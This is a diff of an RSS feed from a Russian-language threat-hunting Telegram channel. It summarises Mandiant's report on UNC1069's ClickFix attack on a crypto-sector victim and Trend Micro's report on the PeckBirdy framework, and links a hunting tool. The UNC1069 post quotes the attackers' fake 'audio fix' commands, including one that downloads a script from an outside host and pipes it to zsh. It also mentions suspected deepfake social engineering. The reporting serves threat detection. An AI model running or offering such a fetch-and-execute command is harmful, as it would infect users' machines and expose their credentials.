@@ -1,5 +1,27 @@
 <?xml version="1.0" encoding="utf-8"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Threat Hunting Father 🦔</title><link>https://t.me/ThreatHuntingFather</link><description>All about Threat Hunting, detecting malicious activity</description><language>ru</language><lastBuildDate>Mon, 09 Feb 2026 10:05:53 +0000</lastBuildDate><item><title>PeckBirdy: A Versatile Script Framework for LOLBins Exploitation Used by China-aligned Threat Groups</title><link>https://t.me/ThreatHuntingFather/1145</link><description>PeckBirdy: A Versatile Script Framework for LOLBins Exploitation Used by China-aligned Threat Groups
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Threat Hunting Father 🦔</title><link>https://t.me/ThreatHuntingFather</link><description>All about Threat Hunting, detecting malicious activity</description><language>ru</language><lastBuildDate>Tue, 10 Feb 2026 08:03:05 +0000</lastBuildDate><item><title>UNC1069 Targets Cryptocurrency Sector with New Tooling and AI-Enabled Social Engineering</title><link>https://t.me/ThreatHuntingFather/1153</link><description>UNC1069 Targets Cryptocurrency Sector with New Tooling and AI-Enabled Social Engineering
+Хороший заголовок? 😃
+UNC1069 провёл целевую атаку на представителя криптосектора через социальную инженерию. Жертву завели в фейковую Zoom-встречу через скомпрометированный Telegram-аккаунт, имитировали проблемы со звуком и применили ClickFix - запуск «диагностических» команд привёл к заражению macOS
+system_profiler SPAudioData
+softwareupdate --evaluate-products --products audio --agree-to-license
+curl -A audio -s hxxp://mylingocoin[.]com/audio/fix/6454694440 | zsh
+system_profiler SPSoundCardData
+softwareupdate --evaluate-products --products soundcard
+system_profiler SPSpeechData
+softwareupdate --evaluate-products --products speech --agree-to-license
+После выполнения команд был развернут многоступенчатый тулчейн: WAVESHAPER → HYPERCALL → HIDDENCALL / SUGARLOADER / SILENCELIFT, а затем два стилера - DEEPBREATH (TCC bypass, Keychain, браузеры, Telegram, Notes) и CHROMEPUSH (Chromium-extension, cookies, keylogging). Цель - массовый сбор учётных данных и сессий для финансовой кражи и последующих атак.
+Но самое интересное из этого текста мы говорит не восстановили AI, но чет похожее видели, как по вашему это норм или стрем? 😃
+While Mandiant was unable to recover forensic evidence to independently verify the use of AI models in this specific instance, the reported ruse is similar to a previously publicly reported incident with similar characteristics, where deepfakes were also allegedly used.
+🔗 https://cloud.google.com/blog/topics/threat-intelligence/unc1069-targets-cryptocurrency-ai-social-engineering
+🦔 THF
+
+[Media: Фото]</description><pubDate>Tue, 10 Feb 2026 08:03:05 +0000</pubDate><guid isPermaLink="false">telegram_ThreatHuntingFather_1153</guid></item><item><title>Вот смотрите, коротко к чему приводит Threat Hunting 😃 💊</title><link>https://t.me/ThreatHuntingFather/1152</link><description>Вот смотрите, коротко к чему приводит Threat Hunting 😃 💊
+Решая нетривиальную задачу в атакованной сети, человек просто идет и пишет тул как настоящий блэкхэт, так как зона мониторинга может быть ограничена, только вот он ищет пивот поинты APT, а не нацелен на файлики и конф. данные.
+#IncidentResponce #ThreatHunting
+Тулза вот доступна тут:
+🔗 https://github.com/s0ld13rr/tarahunter
+Автор 🎩:
+https://t.me/s0ld13r_ch/352</description><pubDate>Tue, 10 Feb 2026 06:53:57 +0000</pubDate><guid isPermaLink="false">telegram_ThreatHuntingFather_1152</guid></item><item><title>PeckBirdy: A Versatile Script Framework for LOLBins Exploitation Used by China-aligned Threat Groups</title><link>https://t.me/ThreatHuntingFather/1145</link><description>PeckBirdy: A Versatile Script Framework for LOLBins Exploitation Used by China-aligned Threat Groups
 Trend Micro выявила JScript-фреймворк командного управления (C&amp;C) под названием PeckBirdy, который активно используется прокитайскими APT-акторами с 2023 года. Фреймворк разработан для гибкого развёртывания в различных средах, включая браузеры, MSHTA, WScript и NodeJS, за счёт злоупотребления living-off-the-land бинарями (LOLBins). PeckBirdy выполняет несколько ролей на протяжении всей цепочки атаки - от начального доступа через watering-hole-атаки до бокового перемещения и управления бэкдорами по C&amp;C-каналу.
 Задокументированы две основные кампании, использующие PeckBirdy: SHADOW-VOID-044 и SHADOW-EARTH-045. Кампания SHADOW-VOID-044 нацелена на китайскую индустрию онлайн-гемблинга и разворачивает модульные бэкдоры HOLODONUT и MKDOOR. Кампания SHADOW-EARTH-045 ориентирована на государственные и частные организации в Азии, где PeckBirdy применяется для сбора учётных данных и в качестве канала удалённого доступа. В отчёте эти кампании связываются с известными группировками, такими как UNC3569, Earth Baxia и другими, при этом подчёркивается сложная сеть совместно используемых инструментов и инфраструктуры, включая применение похищенных сертификатов для подписи кода.
 🔗 https://www.trendmicro.com/en_us/research/26/a/peckbirdy-script-framework.html
